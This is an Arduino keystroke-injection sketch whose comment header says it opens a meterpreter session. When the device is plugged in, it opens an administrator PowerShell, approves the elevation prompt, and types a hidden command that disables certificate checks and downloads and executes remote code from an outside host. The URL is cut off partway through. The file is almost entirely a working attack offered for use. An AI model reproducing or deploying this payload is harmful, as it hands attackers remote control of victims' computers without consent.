REM--------------------------------------------------
REM -----This code opens a meterpreter session-------
REM By Anishka Shukla -------------------------------

#include <Keyboard.h>
void setup()
{
Keyboard.begin();
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press('x');
Keyboard.releaseAll();
delay(500);
typeKey('a');
delay(100);
Keyboard.press(KEY_LEFT_ALT);
delay(500);
Keyboard.press('y');
Keyboard.releaseAll();
delay(500);
Keyboard.print("powershell -windowstyle hidden \"[system.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };IEX (New-Object Net.WebClient).DownloadString('http://ip>
typeKey(KEY_RETURN);
Keyboard.end();
}
void loop() {}
void typeKey(int key){
Keyboard.press(key);
delay(500);
Keyboard.release(key);
}



